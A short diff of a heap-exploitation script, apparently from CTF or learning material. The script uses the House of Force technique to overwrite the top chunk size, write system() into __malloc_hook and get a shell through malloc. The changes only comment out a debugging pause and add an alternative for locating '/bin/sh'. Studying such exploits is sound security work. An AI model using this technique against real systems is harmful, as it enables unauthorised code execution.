@@ -55,7 +55,7 @@ io.timeout = 0.1
 
 # Our House of Force primitive to overwrite the top chunk's size field.
 malloc(24, b"Y" * 24 + p64(0xFFFFFFFFFFFFFFFF))
-pause()  # Type `vis` and/or `top-chunk` in pwndbg to confirm the top chunk size
+# pause()  # Type `vis` and/or `top-chunk` in pwndbg to confirm the top chunk size
 
 # The distance to `libc`'s `__malloc_hook`; the (after the heap).
 #
@@ -83,6 +83,8 @@ malloc(
 malloc(24, p64(libc.sym.system))
 
 cmd = heap + 0x30  # The `"bin/sh\0"` string we stored on the heap.
+# An alternative would be:
+# cmd = libc.search(b"/bin/sh")
 
 # Now `malloc` triggers `__malloc_hook`, which we've overwritten with `system()`.
 # So calling `malloc` with the first argument (`size`) set to the address of
